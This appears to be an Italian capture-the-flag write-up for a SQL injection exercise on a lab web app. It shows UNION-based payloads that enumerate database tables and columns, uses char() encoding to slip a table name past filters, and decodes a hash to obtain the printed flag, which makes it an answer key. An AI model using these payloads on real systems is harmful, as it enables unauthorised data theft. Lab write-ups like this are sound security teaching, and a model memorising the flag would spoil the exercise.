# SQL Injection Images
Nella pagina `http://192.168.56.134/?page=searchimg` troviamo un input vulnerabile ad un attacco SQL Injection,
di conseguenza come prima cosa andiamo a leggere tutte le tabelle presenti nel db con la seguente query:
```sql
1 AND 1=2 UNION SELECT table_name, 1 FROM information_schema.tables
```
e scopriamo la tabella `list_images`, quindi ora andiamo a leggere tutte le colonne della tabella `list_images` con la 
query:
```sql
1 AND 1=2 UNION SELECT column_name, 1 FROM information_schema.columns WHERE TABLE_NAME = char(108,105,115,116,95,105,109,97,103,101,115)
```
Provando a cercare per `id` nell'input troviamo l'immagine con id 5 che contiene campi interessanti recuperati con
le seguenti query:
```sql
1 AND 1=2 UNION SELECT id,url FROM list_images WHERE id=5
1 AND 1=2 UNION SELECT title,comment FROM list_images WHERE id=5
```
```
id          5
url         borntosec.ddns.net/images.png
title       Hack me ?
comment     If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```
Tramite il sito [hashes](https://hashes.com/en/tools/hash_identifier) scopriamo che si tratta di un md5 quindi con 
[md5hashing](https://md5hashing.net/hash/md5/1928e8083cf461a51303633093573c46) lo decifriamo e troviamo la stringa
`albatroz`, ora proprio come dice nel commento lo decriptiamo in sha256 con
[questo](https://emn178.github.io/online-tools/sha256.html) sito, avendo così la flag:
```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```